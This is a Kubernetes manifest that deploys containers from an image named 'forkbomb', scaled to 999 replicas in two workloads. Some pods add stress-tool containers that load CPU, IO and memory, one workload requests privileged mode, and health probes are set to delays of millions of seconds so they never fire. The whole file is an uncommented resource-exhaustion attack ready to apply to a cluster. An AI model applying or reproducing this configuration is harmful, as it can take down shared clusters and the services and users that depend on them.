apiVersion: apps/v1
kind: Deployment
metadata:
  name: deploy2
  labels:
    app: deploy2
spec:
  replicas: 1
  selector:
    matchLabels:
      app: deploy2
  template:
    metadata:
      labels:
        app: deploy2
    spec:
      restartPolicy: Always
      containers:
      - name: container-0
        image: hunh0w/forkbomb:version1
        readinessProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 14150000
          periodSeconds: 14150000
        livenessProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 14150000
          periodSeconds: 14150000
      - name: stress
        image: polinux/stress:1.0.4
        command: ["stress"]
        args:
          - "--cpu"
          - "1"
          - "--io"
          - "1"
          - "--vm"
          - "1"
          - "--vm-bytes"
          - "128M"
          - "--timeout"
          - "1s"
          - "--verbose"
        readinessProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 14150000
          periodSeconds: 14150000
        livenessProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 14150000
          periodSeconds: 14150000
---
apiVersion: apps/v1
kind: ReplicaSet
metadata:
  name: repl1
  labels:
    tier: repl1
spec:
  replicas: 999
  selector:
    matchLabels:
      tier: repl1
  template:
    metadata:
      labels:
        tier: repl1
    spec:
      restartPolicy: Always 
      containers:
      - name: container-0
        image: hunh0w/forkbomb:version1
        readinessProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 14150000
          periodSeconds: 14150000
        livenessProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 14150000
          periodSeconds: 14150000
      - name: stress
        image: polinux/stress:1.0.4
        command: ["stress"]
        args:
          - "--cpu"
          - "1"
          - "--io"
          - "1"
          - "--vm"
          - "1"
          - "--vm-bytes"
          - "128M"
          - "--timeout"
          - "1s"
          - "--verbose"
        readinessProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 14150000
          periodSeconds: 14150000
        livenessProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 14150000
          periodSeconds: 14150000
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deploy1
  labels:
    app: deploy1
spec:
  replicas: 999
  selector:
    matchLabels:
      app: deploy1
  template:
    metadata:
      labels:
        app: deploy1
    spec:
      restartPolicy: Always
      securityContext:
        privileged: true
      containers:
      - name: container-0
        image: hunh0w/forkbomb:version1
        readinessProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 4150000
          periodSeconds: 14150000
        livenessProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 4150000
          periodSeconds: 4150000
